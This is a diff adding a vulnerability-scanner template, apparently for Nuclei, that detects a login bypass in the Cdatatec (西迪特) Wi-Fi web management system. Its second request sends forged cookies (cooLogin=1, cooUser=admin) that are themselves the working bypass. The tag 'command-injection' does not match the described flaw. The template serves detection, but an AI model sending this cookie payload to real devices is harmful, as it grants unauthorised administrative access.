@@ -1,0 +1,41 @@
+id: poc-cdatatec-wifi-login-cookie
+info:
+  name: 西迪特 Wi-Fi Web管理系统 前台登录绕过漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: command-injection
+  description: |
+    Detects a login bypass vulnerability in 西迪特 Wi-Fi Web管理系统 by checking response behavior with specific cookies.
+http:
+  - raw:
+      - |
+        GET /cgi-bin/jumpto.php?class=frame&page=main HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "parent.location='/index.html'"
+  - raw:
+      - |
+        GET /cgi-bin/jumpto.php?class=frame&page=main HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: timestamp=0; cooLogin=1; cooUser=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "parent.location='/index.html'"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
